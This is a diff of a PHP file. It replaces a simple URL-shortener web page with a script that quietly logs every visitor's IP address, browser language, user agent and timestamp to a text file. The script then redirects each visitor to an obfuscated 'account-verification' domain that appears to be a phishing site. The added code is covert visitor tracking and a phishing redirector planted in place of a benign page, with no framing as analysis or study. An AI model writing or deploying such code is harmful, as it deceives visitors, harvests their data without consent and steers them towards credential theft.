@@ -1,29 +1,25 @@
-<?php
-	
-	
-	
-	session_start();
+<?
 
-	$_SESSION['prevent_repeat'] = rand(); // Prevent a repeat of the process
+$file1 = fopen("uaip.txt","a");
+
+$time = time();
+
+$date = date(DATE_RFC822, $time);
+
+fwrite($file1,$date);
+
+fwrite($file1, "\r\n");
+
+fwrite($file1, $_SERVER['REMOTE_ADDR']."\r\n");
+
+fwrite($file1, $_SERVER['HTTP_ACCEPT_LANGUAGE']."\r\n");
+
+fwrite($file1, $_SERVER['HTTP_USER_AGENT']."\r\n");
+
+fwrite($file1, "\r\n");
+
+fclose($file1);
+
+header('location:https://account-verification876uhg785jhy6gfd654.info-accss.com/wiukt387o2ikjgjikugfd6398e2mjbis782668igedcbnbcxg6566746784e/wg01hjg76t/index.php')
 
 ?>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>PHP URL Shortener Without Database!</title>
-<meta name="description" content="PHP URL Shortener Without Database!">
-</head>
-<body>
-
-	<form method="post" action="shortener.php">
-		<p>Enter a long link: <input type="text" name="my-link" value=""></p>
-		<p><input type="submit" value="Shorten!"></p>
-	</form>
-
-	<h2>Download & Usage</h2>
-	<p><a href="http://wp-time.com/create-url-shortener-without-database/" target="_blank">PHP URL Shortener Without Database</a></p>
-
-</body>
-</html>
